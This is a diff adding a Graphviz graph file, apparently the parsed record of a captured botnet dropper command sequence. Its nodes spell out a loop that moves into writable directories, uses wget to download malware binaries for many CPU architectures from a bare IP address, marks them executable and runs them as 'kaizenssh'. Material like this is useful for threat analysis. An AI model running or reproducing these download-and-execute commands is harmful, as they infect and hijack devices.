@@ -1,0 +1,222 @@
+digraph {
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 10 [label="||,"];
+10 [label="wget http://104.244.72.82/bins/ssh.mips "];
+10 -> 12 [label=";,"];
+12 [label="/bin/busybox wget http://104.244.72.82/bins/ssh.mips "];
+12 -> 14 [label=";,"];
+14 [label="cat ssh.mips kaizenssh "];
+14 -> 214 [label=";,"];
+214 [label="kaizenssh "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 218 [label=";,"];
+218 [label="./kaizenssh loader.ssh "];
+218 -> 198 [label=";,"];
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 32 [label="||,"];
+32 [label="wget http://104.244.72.82/bins/ssh.mpsl "];
+32 -> 34 [label=";,"];
+34 [label="/bin/busybox wget http://104.244.72.82/bins/ssh.mpsl "];
+34 -> 36 [label=";,"];
+36 [label="cat ssh.mpsl kaizenssh "];
+36 -> 214 [label=";,"];
+214 [label="kaizenssh "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 218 [label=";,"];
+218 [label="./kaizenssh loader.ssh "];
+218 -> 198 [label=";,"];
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 54 [label="||,"];
+54 [label="wget http://104.244.72.82/bins/ssh.mips64 "];
+54 -> 56 [label=";,"];
+56 [label="/bin/busybox wget http://104.244.72.82/bins/ssh.mips64 "];
+56 -> 58 [label=";,"];
+58 [label="cat ssh.mips64 kaizenssh "];
+58 -> 214 [label=";,"];
+214 [label="kaizenssh "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 218 [label=";,"];
+218 [label="./kaizenssh loader.ssh "];
+218 -> 198 [label=";,"];
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 76 [label="||,"];
+76 [label="wget http://104.244.72.82/bins/ssh.x32 "];
+76 -> 78 [label=";,"];
+78 [label="/bin/busybox wget http://104.244.72.82/bins/ssh.x32 "];
+78 -> 80 [label=";,"];
+80 [label="cat ssh.x32 kaizenssh "];
+80 -> 214 [label=";,"];
+214 [label="kaizenssh "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 86 [label=";,"];
+86 [label="./kaizenssh ssh.x86 "];
+86 -> 198 [label=";,"];
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 98 [label="||,"];
+98 [label="wget http://104.244.72.82/bins/ssh.x86 "];
+98 -> 100 [label=";,"];
+100 [label="/bin/busybox wget http://104.244.72.82/bins/ssh.x86 "];
+100 -> 102 [label=";,"];
+102 [label="cat ssh.x86 kaizenssh "];
+102 -> 214 [label=";,"];
+214 [label="kaizenssh "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 108 [label=";,"];
+108 [label="./kaizenssh ssh.x32 "];
+108 -> 198 [label=";,"];
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 120 [label="||,"];
+120 [label="wget http://104.244.72.82/bins/ssh.arm "];
+120 -> 122 [label=";,"];
+122 [label="/bin/busybox wget http://104.244.72.82/bins/ssh.arm "];
+122 -> 124 [label=";,"];
+124 [label="cat ssh.arm kaizenssh "];
+124 -> 214 [label=";,"];
+214 [label="kaizenssh "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 218 [label=";,"];
+218 [label="./kaizenssh loader.ssh "];
+218 -> 198 [label=";,"];
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 142 [label="||,"];
+142 [label="wget http://104.244.72.82/bins/ssh.arm6 "];
+142 -> 144 [label=";,"];
+144 [label="/bin/busybox wget http://104.244.72.82/bins/ssh.arm6 "];
+144 -> 146 [label=";,"];
+146 [label="cat ssh.arm6 kaizenssh "];
+146 -> 214 [label=";,"];
+214 [label="kaizenssh "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 218 [label=";,"];
+218 [label="./kaizenssh loader.ssh "];
+218 -> 198 [label=";,"];
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 164 [label="||,"];
+164 [label="wget http://104.244.72.82/bins/ssh.arm7 "];
+164 -> 166 [label=";,"];
+166 [label="/bin/busybox wget http://104.244.72.82/bins/ssh.arm7 "];
+166 -> 168 [label=";,"];
+168 [label="cat ssh.arm7 kaizenssh "];
+168 -> 214 [label=";,"];
+214 [label="kaizenssh "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 218 [label=";,"];
+218 [label="./kaizenssh loader.ssh "];
+218 -> 198 [label=";,"];
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 186 [label="||,"];
+186 [label="wget http://104.244.72.82/bins/ssh.ppc "];
+186 -> 188 [label=";,"];
+188 [label="/bin/busybox wget http://104.244.72.82/bins/ssh.ppc "];
+188 -> 190 [label=";,"];
+190 [label="cat ssh.ppc kaizenssh "];
+190 -> 214 [label=";,"];
+214 [label="kaizenssh "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 218 [label=";,"];
+218 [label="./kaizenssh loader.ssh "];
+218 -> 198 [label=";,"];
+198 [label="cd /tmp "];
+198 -> 198
+200 [label="cd /var/run "];
+200 -> 202 [label="||,"];
+202 [label="cd /mnt "];
+202 -> 204 [label="||,"];
+204 [label="cd /root "];
+204 -> 206 [label="||,"];
+206 [label="cd / "];
+206 -> 208 [label="||,"];
+208 [label="wget http://104.244.72.82/bins/ssh.sh4 "];
+208 -> 210 [label=";,"];
+210 [label="/bin/busybox wget http://104.244.72.82/bins/ssh.sh4 "];
+210 -> 212 [label=";,"];
+212 [label="cat ssh.sh4 kaizenssh "];
+212 -> 214 [label=";,"];
+214 [label="kaizenssh "];
+214 -> 214
+216 [label="chmod +x * "];
+216 -> 218 [label=";,"];
+218 [label="./kaizenssh loader.ssh "];
+218 -> 219 [label=";,"];
+}
